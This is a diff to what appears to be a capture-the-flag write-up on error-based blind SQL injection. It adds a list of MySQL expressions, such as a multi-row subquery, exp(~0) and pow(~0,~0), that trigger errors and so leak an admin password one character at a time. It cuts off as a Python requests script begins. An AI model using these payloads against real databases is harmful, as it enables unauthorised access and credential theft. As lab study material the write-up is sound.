@@ -21,7 +21,18 @@
 ?>
 ```
 
-Here we have to find the admins password. Here we are not getting the results as output. It's only giving errors. So we are trying to get an error when the character is correct and I wrote a script for that
+Here we have to find the admins password. Here we are not getting the results as output. It's only giving errors. So we are trying to get an error when the character is correct and I wrote a script for that.
+## Methods to get errors
+pw = ""
+1. ### (select id union select pw)
+   It will give an error `Subquery returns more than 1 row`
+2. ### (Select exp(~0))
+   It will give an error `DOUBLE value is out of range in 'exp(~(0))'`
+   source : `https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/`
+3. ### (select pow(~0,~0))
+   It will give an error `DOUBLE value is out of range in 'pow(~(0),~(0))'`
+   
+4. 
 
 ```python
 import requests
